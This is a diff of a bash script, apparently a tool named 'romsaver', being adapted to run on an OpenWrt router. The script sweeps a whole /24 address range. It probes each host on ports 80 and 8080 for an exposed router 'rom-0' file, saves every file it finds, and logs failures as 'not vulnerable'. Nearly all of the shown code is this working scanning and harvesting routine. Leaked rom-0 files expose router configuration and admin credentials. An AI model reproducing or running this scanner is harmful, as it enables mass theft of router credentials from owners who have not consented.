@@ -5,7 +5,8 @@
 # License: The MIT License (MIT)
 #
 
-## ignore this, for my router
+## ignore this, for my openwrt router
+## need bash, wget, curl, file
 # mkdir -p /root/script/romsaver
 # cd /root/script/romsaver
 
@@ -116,19 +117,21 @@ countrom() {
 }
 
 scan_range() {
-  for i in $prefix.{1..255}
-  do
+  i=1
+  while [ $i -lt 256 ]; do
+    
+    iptarget="$prefix.$i"
     cekonline
 
-    echo -n "$i > "
-    echo -n "$i > " >> "logs/$tanggal"
-    wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$i/rom-0"
+    echo -n "$iptarget > "
+    echo -n "$iptarget > " >> "logs/$tanggal"
+    wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$iptarget/rom-0"
     EXIT_CODE=$?
 
     if [ $EXIT_CODE -gt 0 ];
       then
         # coba port 8080
-        wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$i:8080/rom-0"
+        wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$iptarget:8080/rom-0"
         EXIT_CODE=$?
 
         if [ $EXIT_CODE -gt 0 ];
@@ -136,7 +139,7 @@ scan_range() {
             echo -e "\e[31mFailed! -not vulnerable?- \e[0;39m"
             echo "Failed! -not vulnerable?-" >> "logs/$tanggal"
         else
-          wget -q "http://$i:8080/rom-0" -O "rom/$tanggal/$i" &
+          wget -q "http://$iptarget:8080/rom-0" -O "rom/$tanggal/$iptarget" &
           PID=$!
           sleep $pausetime
           PSPID=$(ps | grep $PID | grep -v grep)
@@ -145,15 +148,15 @@ scan_range() {
             kill $PID > /dev/null 2>&1
             echo -e "\e[31mFailed! -timeout- download 8080\e[0;39m"
             echo "Failed! -timeout- download 8080" >> "logs/$tanggal"
-            rm "rom/$tanggal/$i" > /dev/null 2>&1
+            rm "rom/$tanggal/$iptarget" > /dev/null 2>&1
           else
             # ok
-            cekmime "$i" "8080"
+            cekmime "$iptarget" "8080"
           fi
         fi
 
     else
-      wget -q "http://$i/rom-0" -O "rom/$tanggal/$i" &
+      wget -q "http://$iptarget/rom-0" -O "rom/$tanggal/$iptarget" &
       PID=$!
       sleep $pausetime
       PSPID=$(ps | grep $PID | grep -v grep)
@@ -162,14 +165,15 @@ scan_range() {
         kill $PID > /dev/null 2>&1
         echo -e "\e[31mFailed! -timeout- download 80\e[0;39m"
         echo "Failed! -timeout- download 80" >> "logs/$tanggal"
-        rm "rom/$tanggal/$i" > /dev/null 2>&11
+        rm "rom/$tanggal/$iptarget" > /dev/null 2>&11
       else
         # ok
-        cekmime "$i"
+        cekmime "$iptarget"
       fi
 
     fi
 
+    let i=i+1
   done
 
   echo "" >> "logs/$tanggal"
@@ -185,8 +189,3 @@ scan_range() {
 # }
 
 start "$@"
-# rm "rom/*" > /dev/null 2>&1
-
-
-# cek file smaller than 7kb ||| find . -type f -size -7k | wc -l
-# count last scan / count total
